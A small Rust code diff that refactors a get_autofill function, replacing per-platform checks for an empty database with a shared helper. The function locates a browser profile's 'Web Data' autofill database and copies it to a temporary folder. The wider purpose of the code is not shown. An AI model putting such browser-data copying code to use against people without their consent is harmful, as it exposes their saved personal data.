@@ -19,34 +19,7 @@ pub(super) async fn get_autofill(
         path.push(profile);
         path.push("Web Data");
 
-        #[cfg(target_os = "windows")]
-        {
-            use std::os::windows::fs::MetadataExt;
-            if let Ok(f) = std::fs::metadata(path.as_os_str()) {
-                if f.file_size() == 0 {
-                    return Err(std::io::Error::new(
-                        std::io::ErrorKind::Other,
-                        "Database is empty",
-                    ));
-                }
-            }
-        }
-        #[cfg(target_os = "linux")]
-        {
-            use std::os::linux::fs::MetadataExt;
-            if let Ok(f) = std::fs::metadata(path.as_os_str()) {
-                if f.st_size() == 0 {
-                    return Err(std::io::Error::new(
-                        std::io::ErrorKind::Other,
-                        "Database is empty",
-                    ));
-                }
-            }
-        }
-        #[cfg(not(any(target_os = "windows", target_os = "linux")))]
-        {
-            compile_error!("Unsupported target.");
-        }
+        super::check_db_size(path).await?;
 
         // Copy the file to the temporary folder
         std::fs::copy(&path, tempfile).unwrap();
